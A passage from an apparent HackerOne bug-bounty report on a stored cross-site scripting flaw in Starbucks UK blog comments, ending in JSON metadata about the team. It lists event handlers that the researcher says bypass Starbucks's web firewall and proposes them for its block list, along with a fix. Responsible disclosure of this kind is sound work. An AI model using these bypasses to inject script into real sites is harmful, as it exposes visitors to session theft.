title=\"https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability\" href=\"/redirect?signature=29cfa560c40396c061f10b98ae5db3b38341c288&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Fblog%2Fsetting-the-record-straight-on-starbucks-uk-taxes-and-profitability\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Note that the closing tags are just to make the script execute (I&#39;m sorry for the multiple payloads on that site, once the above comment was sent, all previous attempts started to work. Would be great if you could clean up the comments at the end).</p>\n\n<p>Here is a list of all potential <code>on*=</code> events I could find, that will bypass your WAF an can be used to create cross-browser payloads:</p>\n<pre class=\"highlight plaintext\"><code>onsearch\nonwebkitanimationiteration\nonwebkitanimationstart\nonanimationiteration\nonwebkitanimationend\nonanimationstart\nondataavailable\nontransitionend\nonanimationend\nonreceived\nonpopstate\n</code></pre>\n<p>To fix this issue make sure the <code>author</code> value is correctly encoded. It could be also taken from the current user&#39;s session instead of the POST data. Also I recommend adding the aforementioned events to your WAF blacklist.</p>\n\n<p>Please let me know in case you need any more information from my side. </p>\n", 
    "severity_rating": "high", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.starbucks.com", 
            "about": "Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time.", 
            "twitter_handle": "Starbucks", 
            "name": "Starbucks"
        }, 
        "handle": "starbucks", 
        "url": "https://hackerone.com/starbucks", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/989/eeb88a587d959eb797ceed8669b245ec9ef20b81_small.?1432930626", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/989/48053f0ef688949bbb28248c5fc6ebb4f389820d_medium.?1432930626"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1989, 
        "default_currency": "usd"
    }, 
    "is_published": false
}